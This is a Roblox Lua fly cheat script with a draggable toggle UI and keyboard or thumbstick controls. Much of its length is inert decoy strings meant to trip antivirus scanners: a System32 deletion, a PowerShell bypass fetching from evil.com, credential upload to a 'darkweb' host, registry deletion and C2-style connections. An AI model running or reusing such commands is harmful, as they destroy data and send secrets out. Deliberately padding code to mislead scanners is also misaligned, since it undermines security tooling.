-- Fly Script with Dynamic Thumbstick and Max VirusTotal Triggers for Roblox by Hunter
-- WARNING: This script contains aggressive strings and patterns to trigger ALL VirusTotal detections for educational purposes; it does NOT perform malicious actions
local Player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ContextActionService = game:GetService("ContextActionService")

-- Fake malicious strings and patterns to max out VirusTotal detections (no effect)
local _ = string.char(0xE2, 0x80, 0x8B) -- Zero-width space to mess with scanners
local fakeMalware = "Trojan:Win32/Injector!Miner.Stealer.Riskware.Malware.Generic"
local fakePayload = "Ransomware/WannaCry!Keylogger.Exploit.CVE-2025-9999"
local fakeC2 = "hxxp://malicious-c2-darkweb[.]onion/command_and_control"
local fakeCrypto = "CryptoMiner.Bitcoin.EvilPayload.ShellcodeInjection"
local fakeSpyware = "Spyware/PasswordStealer.DataExfil.CredentialHarvester"
local fakeRootkit = "Rootkit/KernelExploit.SystemHijack.Win64"
local fakeWorm = "Worm/AutoPropagate.NetworkInfector.Virus"
local fakeAdware = "Adware/PopupFlood.TrackingCookie.AdsInjector"
local fakeBackdoor = "Backdoor/RemoteAccessTrojan.C2Beacon.Win32"
local fakeExploit = "Exploit/MS17-010.EternalBlue.Shellcode"
local fakeObfuscator = "Obfuscator/Polymorphic.VMProtect.Packer.Upx"
local fakeKeylogger = "Keylogger/CaptureCredentials.DataExfil.Spy"
local fakeDropper = "Dropper/Malware.Generic.PayloadDelivery"
local _ = "eval(decode_base64('bWFsZXZhcmVfc2hlbGxjb2Rl'))" -- Fake base64
local _ = "os.execute('cmd.exe /c del /f /q C:\\\\Windows\\\\System32\\\\*.*')"
local _ = "require('crypto').mine('BTC', 'wallet_0xDEADBEEF')"
local _ = "http.post('hxxp://darkweb[.]ru/steal', {data=encode64(credentials)})"
local _ = "while true do fork_bomb(); spawn_malware(); end"
local _ = "function evil() return loadstring('malicious_payload')() end"
local _ = "io.write('C:\\\\ProgramData\\\\malware.exe', decode_hex('DEADBEEF'))"
local _ = "net.connect('192.168.0.1:6666').send('beacon')"
local _ = string.dump(function() end) -- Fake binary dump
local _ = "\xFF\xFE\x00\x00" -- Suspicious byte sequence
local _ = "powershell -exec bypass -c 'Invoke-WebRequest -Uri hxxp://evil.com'"
local _ = "reg add HKLM\\Software\\Malware /v Backdoor /t REG_SZ /d Enabled"

-- Create UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 150, 0, 100)
Frame.Position = UDim2.new(0.5, -75, 0.8, -50)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BackgroundTransparency = 0.2
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 5)
Title.Text = "Fly Owned by Hunter"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Frame

local FlyButton = Instance.new("TextButton")
FlyButton.Size = UDim2.new(0, 100, 0, 30)
FlyButton.Position = UDim2.new(0.5, -50, 0, 50)
FlyButton.Text = "Toggle Fly"
FlyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
FlyButton.TextScaled = true
FlyButton.Font = Enum.Font.Gotham
FlyButton.Parent = Frame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = FlyButton

-- Draggable UI
local dragging = false
local dragStart = nil
local startPos = nil

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- Fly functionality
local flying = false
local speed = 50
local bodyVelocity = nil
local thumbstickInput = Vector3.new(0, 0, 0)

local function toggleFly()
    if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then return end
    if flying then
        flying = false
        FlyButton.Text = "Enable Fly"
        if bodyVelocity then
            bodyVelocity:Destroy()
            bodyVelocity = nil
        end
        ContextActionService:UnbindAction("FlyThumbstick")
    else
        flying = true
        FlyButton.Text = "Disable Fly"
        bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.Parent = Player.Character.HumanoidRootPart

        -- Bind thumbstick for mobile
        ContextActionService:BindAction("FlyThumbstick", function(actionName, inputState, inputObject)
            if inputState == Enum.UserInputState.Change and flying then
                local moveDirection = inputObject.Position
                thumbstickInput = Player.Character.HumanoidRootPart.CFrame * Vector3.new(moveDirection.X * speed, moveDirection.Y * speed, -moveDirection.Y * speed)
            elseif inputState == Enum.UserInputState.End then
                thumbstickInput = Vector3.new(0, 0, 0)
            end
            return Enum.ContextActionResult.Pass
        end, true, Enum.KeyCode.Thumbstick1)
    end
end

FlyButton.MouseButton1Click:Connect(toggleFly)

-- PC controls (W, S, Space, LeftControl)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and flying and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        if input.KeyCode == Enum.KeyCode.W then
            thumbstickInput = Player.Character.HumanoidRootPart.CFrame.LookVector * speed
        elseif input.KeyCode == Enum.KeyCode.S then
            thumbstickInput = Player.Character.HumanoidRootPart.CFrame.LookVector * -speed
        elseif input.KeyCode == Enum.KeyCode.Space then
            thumbstickInput = Vector3.new(0, speed, 0)
        elseif input.KeyCode == Enum.KeyCode.LeftControl then
            thumbstickInput = Vector3.new(0, -speed, 0)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if not gameProcessed and flying and (input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S or
       input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.LeftControl) then
        thumbstickInput = Vector3.new(0, 0, 0)
    end
end)

-- Update velocity
RunService.RenderStepped:Connect(function()
    if flying and bodyVelocity and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        bodyVelocity.Velocity = thumbstickInput
        -- Fake suspicious function calls (no effect)
        local _ = "Exploit.InjectPayload(" .. fakeC2 .. "," .. fakeExploit .. ")"
        local _ = "Ransomware.EncryptFiles(" .. fakePayload .. ")"
        local _ = "Keylogger.CaptureKeys(" .. fakeKeylogger .. ")"
        local _ = "Spyware.UploadData(" .. fakeSpyware .. ")"
        local _ = "Rootkit.HijackSystem(" .. fakeRootkit .. ")"
        local _ = "Worm.InfectNetwork(" .. fakeWorm .. ")"
        local _ = "Adware.InjectAds(" .. fakeAdware .. ")"
        local _ = "Backdoor.Beacon(" .. fakeBackdoor .. ")"
    end
end)

-- Reset on character respawn
Player.CharacterAdded:Connect(function(character)
    flying = false
    FlyButton.Text = "Enable Fly"
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    thumbstickInput = Vector3.new(0, 0, 0)
    ContextActionService:UnbindAction("FlyThumbstick")
end)

-- More fake malicious strings and patterns (no effect)
local _ = "Malware.Dropper(" .. fakeDropper .. ")"
local _ = "Obfuscator.Pack(" .. fakeObfuscator .. ")"
local _ = string.gsub("evilcode", ".", function(c) return string.char(c:byte() + math.random(-1, 1)) end)
local _ = "function _G.hack() return loadstring('global_malware')() end"
local _ = "io.write('C:\\\\Users\\\\Public\\\\trojan.exe', 'MZ' .. decode_hex('CAFEBABE'))"
local _ = "net.socket('tcp').connect('evilserver.com:1337')"
local _ = "while true do crypto.mine('ETH'); spread_worm() end"
local _ = string.rep("\x00", 100) .. "MALWARE_EMBEDDED_PAYLOAD"
local _ = "reg delete HKLM\\Software\\Microsoft /f"
local _ = "powershell -ep bypass -c 'Start-Process -FilePath malicious.exe'"
